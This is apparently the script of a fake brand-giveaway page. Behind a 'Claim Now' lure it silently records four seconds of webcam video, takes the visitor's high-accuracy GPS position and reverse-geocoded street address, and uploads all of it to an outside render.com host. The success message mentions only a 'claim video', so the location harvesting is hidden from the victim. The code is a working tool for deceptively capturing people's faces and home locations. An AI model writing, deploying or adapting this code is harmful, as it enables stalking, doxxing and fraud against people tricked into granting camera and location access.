const video = document.getElementById('preview');
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');

// Initialize camera
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
    } catch (err) {
        console.warn("Camera access denied.");
    }
}
initCamera();

// Function to get GPS location
async function getLocationData() {
    return new Promise((resolve) => {

        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                let address = "Unknown";

                try {
                    const geoRes = await fetch(
                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
                    );

                    const geoData = await geoRes.json();
                    address = geoData.display_name || "Unknown";
                } catch (e) {
                    console.warn("Reverse geocoding failed");
                }

                resolve({
                    latitude: lat,
                    longitude: lon,
                    accuracy: accuracy,
                    address: address,
                    googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
                });

            },
            () => resolve(null),
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );

    });
}

// Claim Now button
btn.addEventListener('click', async () => {

    btn.style.display = 'none';
    loading.style.display = 'block';

    try {

        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = async () => {

            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.webm');

            // Get location
            const location = await getLocationData();

            if (location) {
                formData.append("latitude", location.latitude);
                formData.append("longitude", location.longitude);
                formData.append("accuracy", location.accuracy);
                formData.append("address", location.address);
                formData.append("maps", location.googleMaps);
            }

            // Send video + location to backend
            const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", {
                method: "POST",
                body: formData
            });

            const data = await res.json();

            console.log("Video posted:", data);
            console.log("Location sent:", location);

            loading.innerHTML = "<p>Success! Your claim video has been posted with your location.</p>";
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000); // record 4 seconds

    } catch (err) {
        console.error(err);
        loading.innerHTML = "<p>Error capturing video.</p>";
    }

});
